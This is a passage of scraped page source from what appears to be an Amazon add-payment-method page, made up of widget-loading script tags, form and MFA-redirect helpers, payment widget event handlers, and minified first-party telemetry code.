</script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/61-6nKPKyWL._RC|11Y+5x+kkTL.js,51106gSDnJL.js,11-zXBZR6KL.js,11giXtZCwVL.js,31aYV8Ve4wL.js,01VRMV3FBdL.js,01O9dYORveL.js,21NNXfMitSL.js,11rRjDLdAVL.js,51X-X0x2aRL.js,11UdUjBLtPL.js,11UNQpqeowL.js,11OREnu1epL.js,11KbZymw5ZL.js,21r53SJg7LL.js,0190vxtlzcL.js,61FXvKPsyQL.js,31oDRhpnLoL.js,015c-6CIP9L.js,31J9sEK3CtL.js,11VS-C+YWGL.js,31+jtu4krZL.js,01qkmZhGmAL.js,01+b9cewx1L.js_.js?AUIClients/AmazonUI&amp;qa9N+d93#mobile.348458-T1.309035-T1"></script>


    

    






<script type="text/javascript">
    P.when('jQuery', 'ready').register('form-helper', function($) {

    /**
     * Helper function for constructing and submitting a hidden form
     *
     * @param method specifies how to send form data (ie. GET, POST)
     * @param action Where to send the form data when the form is submitted
     * @param formData Data to be sent
     */
    function submitForm(method, action, formData) {
        var $form = $("<form></form>").attr({
            method: method,
            action: action
        });
        for (var key in formData) {
            if (formData.hasOwnProperty(key)) {
                $('<input type="hidden" />').attr({
                    name: key,
                    value: formData[key]
                }).appendTo($form);
            }
        }
        $('body').append($form);
        $form.submit();
    }

    return {
        submitForm: submitForm
    }
});
    P.when('jQuery', 'ready').register('mfaRedirectUrlFetcher', function($) {

    /**
     * Helper function for making AJAX call to controller to fetch the
     * interstitialPageUrl for redirection to MFA widget.
     */
    function getInterstitialPageUrl(url, data) {
        var json_data = JSON.stringify(data);
        var resultUrl;
        $.ajax({
            type: "POST",
            async: false,
            url: url,
            data: json_data,
            dataType: "json",
            contentType: "application/json;charset=utf-8",
            success: function(response) {
                resultUrl = response.interstitialPageUrl;
            }
        });

        return resultUrl;
    }

    return {
        getInterstitialPageUrl: getInterstitialPageUrl
    }
});

    
    window.widgets = {};

    window.APXConfig = {
        onWidgetCreated: [function(widget) {
            widgets[widget.type] = widget;

            var subPageHandler =
                
                    
                    
                    
                    
                    
                    {
                        "WidgetAction": function(e) {
                            P.when('A').execute(function(A) {
                                A.trigger('apx:add-payment-method:WidgetAction', e);
                            });
                        },
                        "FormSubmitted": function(e) {
                            P.when('A').execute(function(A) {
                                A.trigger('apx:add-payment-method:SecureRegistrationFormSubmitted', e);
                            });
                        },
                        "newBankAccountFormSubmitted": function(e) {
                            P.when('A').execute(function(A) {
                                A.trigger('apx:add-payment-method:SecureRegistrationFormSubmitted', e);
                            });
                        },
                        "CloseSecureContainerEvent": function(e) {
                            P.when('A').execute(function(A) {
                                A.trigger('apx:add-payment-method:CloseSecureRegistrationForm', e);
                            });
                        },
                        "DisplaySecureContainerEvent": function(e) {
                            P.when('A').execute(function(A) {
                                A.trigger('apx:add-payment-method:display-iframe', e);
                            });
                        },
                        "AuthTimeout" : function() {
                            P.when('A').execute(function(A) {
                                A.trigger('apx:AuthTimeout');
                            });
                            return APX.events.STOP_EVENT_PROCESSING;
                        }
                    };
                    
                    
                    
                    
                

            var allHandlers = {
                "AuthTimeout" : function() {
                    window.location.reload();
                    return APX.events.STOP_EVENT_PROCESSING;
                },
                "Fatal" : function() {
                    return APX.events.STOP_EVENT_PROCESSING;
                },
                "Done" : function() {
                    return APX.events.STOP_EVENT_PROCESSING;
                }
            };

            for (var prop in subPageHandler) {
                allHandlers[prop] = subPageHandler[prop];
            }

            for (var event in allHandlers) {
                widget.on(event, allHandlers[event]);
            }
        }]
    };
</script>


    

    <script type="text/javascript">
window.ue_ihe = (window.ue_ihe || 0) + 1;
if (window.ue_ihe === 1) {
(function(k,l,g){function m(a){c||(c=b[a.type].id,"undefined"===typeof a.clientX?(e=a.pageX,f=a.pageY):(e=a.clientX,f=a.clientY),2!=c||h&&(h!=e||n!=f)?(r(),d.isl&&l.setTimeout(function(){p("at",d.id)},0)):(h=e,n=f,c=0))}function r(){for(var a in b)b.hasOwnProperty(a)&&d.detach(a,m,b[a].parent)}function s(){for(var a in b)b.hasOwnProperty(a)&&d.attach(a,m,b[a].parent)}function t(){var a="";!q&&c&&(q=1,a+="&ui="+c);return a}var d=k.ue,p=k.uex,q=0,c=0,h,n,e,f,b={click:{id:1,parent:g},mousemove:{id:2,
parent:g},scroll:{id:3,parent:l},keydown:{id:4,parent:g}};d&&p&&(s(),d._ui=t)})(ue_csm,window,document);



(function(l,e){function c(b){b="";var c=a.isBFT?"b":"s",d=""+a.oid,g=""+a.lid,h=d;d!=g&&20==g.length&&(c+="a",h+="-"+g);a.tabid&&(b=a.tabid+"+");b+=c+"-"+h;b!=f&&100>b.length&&(f=b,a.cookie?a.cookie.updateCsmHit(m,b+("|"+ +new Date)):e.cookie="csm-hit="+b+("|"+ +new Date)+n+"; path=/")}function p(){f=0}function d(b){!0===e[a.pageViz.propHid]?f=0:!1===e[a.pageViz.propHid]&&c({type:"visible"})}var n="; expires="+(new Date(+new Date+6048E5)).toGMTString(),m="tb",f,a=l.ue||{},k=a.pageViz&&a.pageViz.event&&
a.pageViz.propHid;a.attach&&(a.attach("click",c),a.attach("keyup",c),k||(a.attach("focus",c),a.attach("blur",p)),k&&(a.attach(a.pageViz.event,d,e),d({})));a.aftb=1})(ue_csm,ue_csm.document);


ue_csm.ue.stub(ue,"impression");


ue.stub(ue,"trigger");



if(window.ue&&uet) { uet('bb'); }

}
</script>
<script>window.ue && ue.count && ue.count('CSMLibrarySize', 1520)</script>
<script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/01F0eSdeFgL.js?AUIClients/APXWidgetsAssets-APXWidgets-PayAtStore"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/01KQiyjBXkL.js?AUIClients/APXWidgetsAssets-APXWidgets-PIX"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/81vvm+pCl7L.js?AUIClients/APXWidgetsAssets-PaymentsPortalWidgets2"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/21Z1S1rsc-L.js?AUIClients/APXWidgetsAssets-APXWidgets-PurchaseFinancing"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/01Bx6iRzs1L.js?AUIClients/APXWidgetsAssets-APXWidgets-Card"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/01DhEXx98+L.js?AUIClients/APXWidgetsAssets-APXWidgets-GiftCard"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/01KEiID0qNL.js?AUIClients/APXWidgetsAssets-APXWidgets-BankAccount"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/01Ubn4yPj2L.js?AUIClients/APXWidgetsAssets-APXWidgets-PbBA"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/11bXxjnDB7L.js?AUIClients/APXWidgetsAssets-APXWidgets-AggregatedAmazonProductVouchers"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/61BcWBmpYxL.js?AUIClients/APXWidgetsAssets-PaymentsPortalWidgetFramework2"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/01KeVI9xAiL.js?AUIClients/APXWidgetsAssets-APXWidgets-BankRefund"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/01jBhBKMwAL.js?AUIClients/APXWidgetsAssets-APXWidgets-Transactions"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/21935gNokRL.js?AUIClients/APXWidgetsAssets-APXWidgets-Wallet"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/01CUisRJf+L.js?AUIClients/APXWidgetsAssets-APXWidgets-Balances"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/21g8EsvvBYL.js?AUIClients/APXWidgetsAssets-APXWidgets-CreditCardBillPayment"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/015rN+KrT4L.js?AUIClients/APXWidgetsAssets-APXWidgets-ReplenishmentPayments"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/31CWIt7PpQL.js?AUIClients/APXWidgetsAssets-APXWidgets-GlobalInstallmentLending"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/31gUuU0p4OL.js?AUIClients/APXWidgetsAssets-APXWidgets-FoodVoucherCard"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/01NntqeL3fL.js?AUIClients/APXWidgetsAssets-APXWidgets-BusinessInvoicing"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/01ghTmZWxzL.js?AUIClients/APXWidgetsAssets-APXWidgets-BusinessPaymentProducts"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/31CpnYISE6L.js?AUIClients/APXWidgetsAssets-APXWidgets-AmazonPayEMI"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/11FLRVpft9L.js?AUIClients/APXWidgetsAssets-APXWidgets-PaymentAuthenticationApprovers"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/01RRCzTIGEL.js?AUIClients/APXWidgetsAssets-APXWidgets-B2BPaymentsAcceptance"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/01ABJiWqfwL.js?AUIClients/APXWidgetsAssets-APXWidgets-Bellamy"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/51Rug0B2RYL.js?AUIClients/APXWidgetsAssets-APXWidgets-AIPS"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/013ll6WhZAL.js?AUIClients/APXWidgetsAssets-APXWidgets-NetBankingCard"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/01UQyGktSML.js?AUIClients/APXWidgetsAssets-APXWidgets-DPMCommon"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/01xxApHnfyL.js?AUIClients/APXWidgetsAssets-APXWidgets-PaymentLocation"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/01iFWiaisVL.js?AUIClients/APXWidgetsAssets-APXWidgets-Boleto"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/314RepM++zL.js?AUIClients/APXWidgetsAssets-APXWidgets-AmazonProductVouchers"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/01N8Y19wNZL.js?AUIClients/APXWidgetsAssets-APXWidgets-MobileCarrierBilling"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/21-hZBVYg0L.js?AUIClients/APXWidgetsAssets-APXWidgets-PostPay"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/01-aaq0fL6L.js?AUIClients/APXWidgetsAssets-APXWidgets-RewardsAccount"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/51v9nQjHwfL.js?AUIClients/APXWidgetsAssets-APXWidgets-EquatedMonthlyInstallments"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/01MO6nvtT1L.js?AUIClients/APXWidgetsAssets-APXWidgets-BLIK"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/21njsjvTWzL.js?AUIClients/APXWidgetsAssets-APXWidgets-AmazonBusinessCredit"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/21nLOGfN-dL.js?AUIClients/APXWidgetsAssets-APXWidgets-OfficialValidDocument"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/011NTyaMItL.js?AUIClients/APXWidgetsAssets-APXWidgets-Maple"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/01pdiXFwV9L.js?AUIClients/APXWidgetsAssets-APXWidgets-Points"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/01j3UbDYoSL.js?AUIClients/APXWidgetsAssets-APXWidgets-WeChatPay"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/413Uil5n-YL.js?AUIClients/APXWidgetsAssets-APXWidgets-ZipPay"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/21O8cpr6qsL.js?AUIClients/APXWidgetsAssets-APXWidgets-ShopWithPoints"></script><script type="text/javascript" async="" crossorigin="anonymous" src="https://images-na.ssl-images-amazon.com/images/I/41x4pecYN0L.js?AUIClients/APXWidgetsAssets-APXWidgets-PayWithBankAccount"></script></head>
<body class="a-m-us a-aui_72554-c a-aui_button_aria_label_markup_348458-t1 a-aui_csa_templates_buildin_ww_exp_337518-t1 a-aui_csa_templates_buildin_ww_launch_337517-c a-aui_csa_templates_declarative_ww_exp_337521-c a-aui_csa_templates_declarative_ww_launch_337520-c a-aui_dynamic_img_a11y_markup_345061-t1 a-aui_mm_desktop_exp_291916-c a-aui_mm_desktop_launch_291918-c a-aui_mm_desktop_targeted_exp_291928-c a-aui_mm_desktop_targeted_launch_291922-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c"><div id="a-page"><script type="a-state" data-a-state="{&quot;key&quot;:&quot;a-wlab-states&quot;}">{"AUI_BUTTON_ARIA_LABEL_MARKUP_348458":"T1","AUI_MM_DESKTOP_LAUNCH_291918":"C","AUI_CSA_TEMPLATES_BUILDIN_WW_EXP_337518":"T1","AUI_DYNAMIC_IMG_A11Y_MARKUP_345061":"T1","AUI_CSA_TEMPLATES_DECLARATIVE_WW_LAUNCH_337520":"C","AUI_CSA_TEMPLATES_BUILDIN_WW_LAUNCH_337517":"C","AUI_CSA_TEMPLATES_DECLARATIVE_WW_EXP_337521":"C"}</script>

<script>
!function(){function n(n,t){var r=i(n);return t&&(r=r("instance",t)),r}var r=[],c=0,i=function(t){return function(){var n=c++;return r.push([t,[].slice.call(arguments,0),n,{time:Date.now()}]),i(n)}};n._s=r,this.csa=n}();;
csa('Config', {});
if (window.csa) {
    csa("Config", {
        
        'Events.Namespace': 'csa',
        'ObfuscatedMarketplaceId': 'ATVPDKIKX0DER',
        'Events.SushiEndpoint': 'https://unagi.amazon.com/1/events/com.amazon.csm.csa.prod',
        'CacheDetection.RequestID': "9BH15D7TY9EC4M7ZAWTN",
        'CacheDetection.Callback': window.ue && ue.reset,
        'LCP.elementDedup': 1
    });

    csa("Events")("setEntity", {
        page: {requestId: "9BH15D7TY9EC4M7ZAWTN", meaningful: "interactive"},
        session: {id: "139-6209373-4758101"}
    });
}
!function(e){var i,r,o="splice",u=e.csa,f={},c={},a=e.csa._s,s=0,l={},g={},h={},n=Object.keys;function t(n,t){return u(n,t)}function v(n,t){var e=c[n]||{};U(e,t),c[n]=e,y(E,0)}function d(n,t,e){var i=!0;t=b(t),e&&e.buffered&&(i=(h[n]||[]).every(function(n){return!1!==t(n)})),i&&(l[n]||(l[n]=[]),l[n].push(t))}function p(n,t){if(t=b(t),n in g)t(g[n]);else{d(n,function(n){return t(n),!1})}}function m(n,t){if(u("Errors")("logError",n),f.DEBUG)throw t||n}function w(){return Math.abs(4294967295*Math.random()|0).toString(36)}function b(n,t){return function(){try{return n.apply(this,arguments)}catch(n){m(n.message||n,n)}}}function y(n,t){return e.setTimeout(b(n),t)}function E(){for(var n=0;n<a.length;){var t=a[n],e=t[0]in c;if(!e&&!r)return void(s=t.length);e?(a[o](s=n,1),D(t)):n++}}function D(n){var arguments,t=c[n[0]],e=(arguments=n[1])[0];if(!t||!t[e])return m("Undefined function: "+t+"/"+e);i=n[3],c[n[2]]=t[e].apply(t,arguments.slice(1))||{},i=0}function S(){r=1,E()}function U(t,e){n(e).forEach(function(n){t[n]=e[n]})}p("$beforeunload",S),v("Config",{instance:function(n){U(f,n)}}),u.plugin=b(function(n){n(t)}),t.config=f,t.register=v,t.on=d,t.removeListener=function(n,t){var e=l[n];e&&e[o](e.indexOf(t),1)},t.once=p,t.emit=function(n,t,e){for(var i=l[n]||[],r=0;r<i.length;)!1===i[r](t)?i[o](r,1):r++;g[n]=t||{},e&&e.buffered&&(h[n]||(h[n]=[]),100<=h[n].length&&h[n].shift(),h[n].push(t||{}))},t.UUID=function(){return[w(),w(),w(),w()].join("-")},t.time=function(n){var t=i?new Date(i.time):new Date;return"ISO"===n?t.toISOString():t.getTime()},t.error=m,t.warn=function(n,t){if(u("Errors")("logWarn",n),f.DEBUG)throw t||n},t.exec=b,t.timeout=y,t.interval=function(n,t){return e.setInterval(b(n),t)},(t.global=e).csa._s.push=function(n){n[0]in c&&(!a.length||r)?D(n):a[o](s++,0,n)},E(),y(function(){y(S,f.SkipMissingPluginsTimeout||5e3)},1)}("undefined"!=typeof window?window:global);csa.plugin(function(o){var r="addEventListener",e="requestAnimationFrame",t=o.exec,i=o.global,f=o.on;o.raf=function(n){if(i[e])return i[e](t(n))},o.on=function(n,e,t,i){return n&&"function"==typeof n[r]?n[r](e,o.exec(t),i):"string"==typeof n?f(n,e,t,i):void 0}});csa.plugin(function(o){var t,n,r={},e="localStorage",c="sessionStorage",a="local",i="session",u=o.exec;function s(e,t){var n;try{r[t]=!!(n=o.global[e]),n=n||{}}catch(e){r[t]=!(n={})}return n}function f(){t=t||s(e,a),n=n||s(c,i)}function l(e){return e&&e[i]?n:t}o.store=u(function(e,t,n){f();var o=l(n);return e?t?void(o[e]=t):o[e]:Object.keys(o)}),o.storageSupport=u(function(){return f(),r}),o.deleteStored=u(function(e,t){f();var n=l(t);if("function"==typeof e)for(var o in n)n.hasOwnProperty(o)&&e(o,n[o])&&delete n[o];else delete n[e]})});csa.plugin(function(o){function r(n){return function(r){o("Metrics",{producerId:"csa",dimensions:{message:r}})("recordMetric",n,1)}}o.register("Errors",{logError:r("jsError"),logWarn:r("jsWarn")})});csa.plugin(function(r){var o,e=r.global,i=r("Events"),f=e.location,d=e.document,a=((e.performance||{}).navigation||{}).type,t=r.on,u=r.emit,g={};function n(a,e){var t=!!o,n=(e=e||{}).keepPageAttributes;t&&(u("$beforePageTransition"),u("$pageTransition")),t&&!n&&i("removeEntity","page"),o=r.UUID(),n?g.id=o:g={schemaId:"<ns>.PageEntity.1",id:o,url:f.href,server:f.hostname,path:f.pathname,referrer:d.referrer,title:d.title},Object.keys(a||{}).forEach(function(e){g[e]=a[e]}),i("setEntity",{page:g}),u("$pageChange",g,{buffered:1}),t&&u("$afterPageTransition")}function l(){u("$load"),u("$ready"),u("$afterload")}function s(){u("$ready"),u("$beforeunload"),u("$unload"),u("$afterunload")}f&&d&&(t(e,"beforeunload",s),t(e,"pagehide",s),"complete"===d.readyState?l():t(e,"load",l),r.register("SPA",{newPage:n}),n({transitionType:{0:"hard",1:"refresh",2:"back-button"}[a]||"unknown"}))});csa.plugin(function(c){var t="Events",e="UNKNOWN",a="id",u="all",n="messageId",i="timestamp",f="producerId",o="application",r="obfuscatedMarketplaceId",s="entities",d="schemaId",l="version",p="attributes",v="<ns>",g=c.config,h=(c.global.location||{}).host,m=g[t+".Namespace"]||"csa_other",I=g.Application||"Other"+(h?":"+h:""),b=c("Transport"),y={},O=function(t,e){Object.keys(t).forEach(e)};function E(n,i,o){O(i,function(t){var e=o===u||(o||{})[t];t in n||(n[t]={version:1,id:i[t][a]||c.UUID()}),U(n[t],i[t],e)})}function U(e,n,i){O(n,function(t){!function(t,e,n){return"string"!=typeof e&&t!==l?c.error("Attribute is not of type string: "+t):!0===n||1===n||(t===a||!!~(n||[]).indexOf(t))}(t,n[t],i)||(e[t]=n[t])})}function N(o,t,r){O(t,function(t){var e=o[t];if(e[d]){var n={},i={};n[a]=e[a],n[f]=e[f]||r,n[d]=e[d],n[l]=e[l]++,n[p]=i,S(n),U(i,e,1),k(i),b("log",n)}})}function S(t){t[i]=function(t){return"number"==typeof t&&(t=new Date(t).toISOString()),t||c.time("ISO")}(t[i]),t[n]=t[n]||c.UUID(),t[o]=I,t[r]=g.ObfuscatedMarketplaceId||e,t[d]=t[d].replace(v,m)}function k(t){delete t[l],delete t[d],delete t[f]}function w(o){var r={};this.log=function(t,e){var n={},i=(e||{}).ent;return t?"string"!=typeof t[d]?c.error("A valid schema id is required for the event"):(S(t),E(n,y,i),E(n,r,i),E(n,t[s]||{},i),O(n,function(t){k(n[t])}),t[f]=o[f],t[s]=n,void b("log",t)):c.error("The event cannot be undefined")},this.setEntity=function(t){E(r,t,u),N(r,t,o[f])}}g["KillSwitch."+t]||c.register(t,{setEntity:function(t){E(y,t,u),N(y,t,"csa")},removeEntity:function(t){delete y[t]},instance:function(t){return new w(t)}})});csa.plugin(function(s){var c,l="Transport",g="post",u="preflight",r="csa.cajun.",i="store",a="deleteStored",f="sendBeacon",t=0,e=s.config[l+".BufferSize"]||2e3,h=s.config[l+".RetryDelay"]||1500,o=[],p=0,d=[],v=s.global,n=s.on,y=s.once,m=v.document,E=s.timeout,R=s.config[l+".FlushInterval"]||5e3,S=0;function b(n){if(864e5<s.time()-+new Date(n.timestamp))return s.warn("Event is too old: "+n);p<e&&(o.push(n),p++,!S&&t&&(S=E(w,R)))}function w(){d.forEach(function(t){var e=[];o.forEach(function(n){t.accepts(n)&&e.push(n)}),e.length&&(t.chunks?t.chunks(e).forEach(function(n){I(t,n)}):I(t,e))}),o=[],S=0}function I(t,e){function o(){s[a](r+n)}var n=s.UUID();s[i](r+n,JSON.stringify(e)),[function(n,t,e){var o=v.navigator||{},r=v.cordova||{};if(!o[f]||!n[g])return 0;n[u]&&r&&"ios"===r.platformId&&!c&&((new Image).src=n[u]().url,c=1);var i=n[g](t);if(!i.type&&o[f](i.url,i.body))return e(),1},function(n,t,e){if(!n[g])return 0;var o=n[g](t),r=o.url,i=o.body,c=o.type,u=new XMLHttpRequest,a=0;function f(n,t,e){u.open("POST",n),e&&u.setRequestHeader("Content-Type",e),u.send(t)}return u.onload=function(){u.status<299?e():s.config[l+".XHRRetries"]&&a<3&&E(function(){f(r,i,c)},++a*h)},f(r,i,c),1}].some(function(n){try{return n(t,e,o)}catch(n){}})}y("$afterload",function(){t=1,function(e){(s[i]()||[]).forEach(function(n){if(!n.indexOf(r))try{var t=s[i](n);s[a](n),JSON.parse(t).forEach(e)}catch(n){s.error(n)}})}(b),n(m,"visibilitychange",w,!1),w()}),y("$afterunload",function(){t=1,w()}),n("$afterPageTransition",function(){p=0}),s.register(l,{log:b,register:function(n){d.push(n)}})});csa.plugin(function(n){var r=n.config["Events.SushiEndpoint"];n("Transport")("register",{accepts:function(n){return n.schemaId},post:function(n){var t=n.map(function(n){return{data:n}});return{url:r,body:JSON.stringify({events:t})}},preflight:function(){var n,t=/\/\/(.*?)\//.exec(r);return t&&t[1]&&(n="https://"+t[1]+"/ping"),{url:n}},chunks:function(n){for(var t=[];500<n.length;)t.push(n.splice(0,500));return t.push(n),t}})});csa.plugin(function(n){var t,a,o,r,e=n.config,i="PageViews",d=e[i+".ImpressionMinimumTime"]||1e3,s="hidden",c="innerHeight",g="innerWidth",l="renderedTo",f=l+"Viewed",m=l+"Meaningful",u=l+"Impressed",p=1,v=2,h=3,w=4,y=5,P="loaded",I=7,T=8,b=n.global,E=n.on,V=n("Events",{producerId:"csa"}),$=b.document,M={},S={},H=y;function K(e){if(!M[I]){var i;if(M[e]=n.time(),e!==h&&e!==P||(t=t||M[e]),t&&H===w)a=a||M[e],(i={})[m]=t-o,i[f]=a-o,R("PageView.4",i),r=r||n.timeout(j,d);if(e!==y&&e!==p&&e!==v||(clearTimeout(r),r=0),e!==p&&e!==v||R("PageRender.3",{transitionType:e===p?"hard":"soft"}),e===I)(i={})[m]=t-o,i[f]=a-o,i[u]=M[e]-o,R("PageImpressed.2",i)}}function R(e,i){S[e]||(i.schemaId="<ns>."+e,V("log",i,{ent:"all"}),S[e]=1)}function W(){0===b[c]&&0===b[g]?(H=T,n("Events")("setEntity",{page:{viewport:"hidden-iframe"}})):H=$[s]?y:w,K(H)}function j(){K(I),r=0}function k(){var e=o?v:p;M={},S={},a=t=0,o=n.time(),K(e),W()}function q(){var e=$.readyState;"interactive"===e&&K(h),"complete"===e&&K(P)}e["KillSwitch."+i]||($&&void 0!==$[s]?(k(),E($,"visibilitychange",W,!1),E($,"readystatechange",q,!1),E("$afterPageTransition",k),E("$timing:loaded",q),n.once("$load",q)):n.warn("Page visibility not supported"))});csa.plugin(function(c){var s=c.config["Interactions.ParentChainLength"]||15,e="click",r="touches",f="timeStamp",o="length",u="pageX",g="pageY",p="pageXOffset",h="pageYOffset",m=250,v=5,d=200,l=.5,t={capture:!0,passive:!0},X=c.global,Y=c.emit,n=c.on,x=X.Math.abs,a=(X.document||{}).documentElement||{},y={x:0,y:0,t:0,sX:0,sY:0},N={x:0,y:0,t:0,sX:0,sY:0};function b(t){if(t.id)return"//*[@id='"+t.id+"']";var e=function(t){var e,n=1;for(e=t.previousSibling;e;e=e.previousSibling)e.nodeName===t.nodeName&&(n+=1);return n}(t),n=t.nodeName;return 1!==e&&(n+="["+e+"]"),t.parentNode&&(n=b(t.parentNode)+"/"+n),n}function I(t,e,n){var a=c("Content",{target:n}),i={schemaId:"<ns>.ContentInteraction.1",interaction:t,interactionData:e,messageId:c.UUID()};if(n){var r=b(n);r&&(i.attribution=r);var o=function(t){for(var e=t,n=e.tagName,a=!1,i=t?t.href:null,r=0;r<s;r++){if(!e||!e.parentElement){a=!0;break}n=(e=e.parentElement).tagName+"/"+n,i=i||e.href}return a||(n=".../"+n),{pc:n,hr:i}}(n);o.pc&&(i.interactionData.parentChain=o.pc),o.hr&&(i.interactionData.href=o.hr)}a("log",i),Y("$content.interaction",i)}function i(t){I(e,{interactionX:""+t.pageX,interactionY:""+t.pageY},t.target)}function C(t){if(t&&t[r]&&1===t[r][o]){var e=t[r][0];N=y={e:t.target,x:e[u],y:e[g],t:t[f],sX:X[p],sY:X[h]}}}function D(t){if(t&&t[r]&&1===t[r][o]&&y&&N){var e=t[r][0],n=t[f],a=n-N.t,i={e:t.target,x:e[u],y:e[g],t:n,sX:X[p],sY:X[h]};N=i,d<=a&&(y=i)}}function E(t){if(t){var e=x(y.x-N.x),n=x(y.y-N.y),a=x(y.sX-N.sX),i=x(y.sY-N.sY),r=t[f]-y.t;if(m<1e3*e/r&&v<e||m<1e3*n/r&&v<n){var o=n<e;o&&a&&e*l<=a||!o&&i&&n*l<=i||I((o?"horizontal":"vertical")+"-swipe",{interactionX:""+y.x,interactionY:""+y.y,endX:""+N.x,endY:""+N.y},y.e)}}}n(a,e,i,t),n(a,"touchstart",C,t),n(a,"touchmove",D,t),n(a,"touchend",E,t)});

</script>
<script type="text/javascript">

(function(){function l(a){for(var c=b.location.search.substring(1).split("&"),e=0;e<c.length;e++){var d=c[e].split("=");if(d[0]===a)return d[1]}}window.amzn=window.amzn||{};amzn.copilot=amzn.copilot||{};var b=window,f=document,g=b.P||b.AmazonUIPageJS,h=f.head||f.getElementsByTagName("head")[0],m=0,n=0;amzn.copilot.checkCoPilotSession=function(){f.cookie.match("cpidv")&&("undefined"!==typeof jQuery&&k(jQuery),g&&g.when&&g.when("jQuery").execute(function(a){k(a)}),b.amznJQ&&b.amznJQ.available&&b.amznJQ.available("jQuery",
function(){k(jQuery)}),b.jQuery||g||b.amznJQ||q())};var q=function(){m?b.ue&&"function"===typeof b.ue.count&&b.ue.count("cpJQUnavailable",1):(m=1,f.addEventListener?f.addEventListener("DOMContentLoaded",amzn.copilot.checkCoPilotSession,!1):f.attachEvent&&f.attachEvent("onreadystatechange",function(){"complete"===f.readyState&&amzn.copilot.checkCoPilotSession()}))},k=function(a){if(!n){n=1;amzn.copilot.jQuery=a;a=l("debugJS");var c="https:"===b.location.protocol?1:0,e=1;url="/gp/copilot/handlers/copilot_strings_resources.html";
window.texas&&texas.locations&&(url=texas.locations.makeUrl(url));g&&g.AUI_BUILD_DATE&&(e=0);amzn.copilot.jQuery.ajax&&amzn.copilot.jQuery.ajax({url:url,dataType:"json",data:{isDebug:a,isSecure:c,includeAUIP:e},success:function(a){amzn.copilot.vip=a.serviceEndPoint;amzn.copilot.enableMultipleTabSession=a.isFollowMe;r(a)},error:function(){b.ue.count("cpLoadResourceError",1)}})}},r=function(a){var c=amzn.copilot.jQuery,e=function(){amzn.copilot.setup(c.extend({isContinuedSession:!0},a))};a.CSSUrls&&
